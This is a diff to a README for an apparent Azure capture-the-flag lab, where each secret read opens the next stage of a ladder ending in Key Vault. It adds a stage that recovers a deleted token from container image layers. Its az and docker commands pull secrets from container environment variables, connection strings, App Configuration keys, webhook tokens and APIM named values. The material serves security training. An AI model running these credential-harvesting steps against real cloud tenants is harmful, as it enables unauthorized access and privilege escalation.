@@ -20,22 +20,24 @@ identity, so the role grants are genuine.
 ## The ladder
 
 ```
-Bootstrap   public blob (anonymous)            --submit--> Reader on the Container Instance
-Stage 1     Container Instance env (Reader)    --submit--> Reader on the Data Factory
-Stage 2     Data Factory linked service (Reader)--submit--> App Configuration Data Reader
-Stage 3     App Configuration (Data Reader)    --submit--> Reader on the Monitor action group
-Stage 4     Monitor action group (Reader)      --submit--> Reader on the APIM service
-Stage 5     APIM named value (Reader)          --submit--> Key Vault Secrets User
+Bootstrap   public blob (anonymous)            --submit--> AcrPull + Reader on the Container Registry
+Stage 1     ACR image (AcrPull)                --submit--> Reader on the Container Instance
+Stage 2     Container Instance env (Reader)    --submit--> Reader on the Data Factory
+Stage 3     Data Factory linked service (Reader)--submit--> App Configuration Data Reader
+Stage 4     App Configuration (Data Reader)    --submit--> Reader on the Monitor action group
+Stage 5     Monitor action group (Reader)      --submit--> Reader on the APIM service
+Stage 6     APIM named value (Reader)          --submit--> Key Vault Secrets User
 Final       Key Vault secret (Secrets User)               the flag
 ```
 
 APIM is placed last (before the vault) on purpose: it is the slowest resource to
 provision, so it has the most time to be ready before a player reaches it.
 
-Each stage is one of the standalone labs' mechanisms (`apim_named_value`,
-`app_configuration_secrets`, `container_instance_env`,
-`data_factory_linked_service`, `monitor_action_group`) reusing their original
-flags, wired together so the credential you read is the key to the next door.
+Each stage is one of the standalone labs' mechanisms (image-layer secrets,
+`container_instance_env`, `data_factory_linked_service`,
+`app_configuration_secrets`, `monitor_action_group`, `apim_named_value`) reusing
+their flags, wired together so the credential you read is the key to the next
+door.
 
 ## Walkthrough
 
@@ -62,7 +64,30 @@ curl -s -X POST "$GK/unlock" -H 'Content-Type: application/json' \
 az login --username <attacker_upn> --password <attacker_password>
 ```
 
-### Stage 1 — Container Instance env vars (Reader on the container)
+### Stage 1 — ACR image (AcrPull on the registry)
+
+The bootstrap unlock grants AcrPull (+ Reader so the CLI can resolve the
+registry). Pull the image and dig out the secret it hides:
+
+```bash
+az acr login --name <acr-name>
+docker pull <acr-name>.azurecr.io/cumulonimbus/app:latest
+
+# Running it shows a config file — but that token is an OLD rotated decoy:
+docker run --rm <acr-name>.azurecr.io/cumulonimbus/app:latest cat /app/config/app.config
+
+# The REAL flag was written into a layer then deleted; recover it from history:
+docker history --no-trunc <acr-name>.azurecr.io/cumulonimbus/app:latest | grep -i deploy_token
+# (or: docker save ... | tar -x  and grep the layers)
+```
+
+The `DEPLOY_TOKEN` value (not the `legacy_deploy_token` decoy) is the flag.
+Submit it → unlocks **Reader on the Container Instance**.
+
+> No Docker? Use `crane`/`oras` against `<acr-name>.azurecr.io` after
+> `az acr login --name <acr-name> --expose-token`.
+
+### Stage 2 — Container Instance env vars (Reader on the container)
 
 ```bash
 az container show -g <rg> -n <container-group> \
@@ -72,7 +97,7 @@ az container show -g <rg> -n <container-group> \
 `SECRET_FLAG` is the flag; `NEXT_HOP` names the Data Factory. Submit → unlocks
 **Reader on the Data Factory**.
 
-### Stage 2 — Data Factory linked service (Reader)
+### Stage 3 — Data Factory linked service (Reader)
 
 ```bash
 az extension add --name datafactory 2>/dev/null
@@ -83,7 +108,7 @@ az datafactory linked-service show -g <rg> --factory-name <adf-name> \
 The `AccountKey=` in the connection string is the flag; the `description` names
 the App Configuration store. Submit → unlocks **App Configuration Data Reader**.
 
-### Stage 3 — App Configuration (Data Reader)
+### Stage 4 — App Configuration (Data Reader)
 
 ```bash
 az appconfig kv list --name <config-store> --auth-mode login --all -o table
@@ -92,7 +117,7 @@ az appconfig kv list --name <config-store> --auth-mode login --all -o table
 `secrets/api-key` is the flag; `secrets/next-hop` names the Monitor action group.
 Submit the flag → unlocks **Reader on the Monitor action group**.
 
-### Stage 4 — Monitor action group webhook token (Reader)
+### Stage 5 — Monitor action group webhook token (Reader)
 
 ```bash
 az monitor action-group show -g <rg> -n <action-group> \
@@ -103,7 +128,7 @@ The `security-alerts` webhook URL contains the flag in its `token=` parameter;
 the `apim-pointer` webhook names the APIM service. Submit the flag → unlocks
 **Reader on the APIM service**.
 
-### Stage 5 — APIM named value (Reader on the APIM service)
+### Stage 6 — APIM named value (Reader on the APIM service)
 
 ```bash
 az apim nv show -g <rg> --service-name <apim-name> --named-value-id flag-key --query value -o tsv
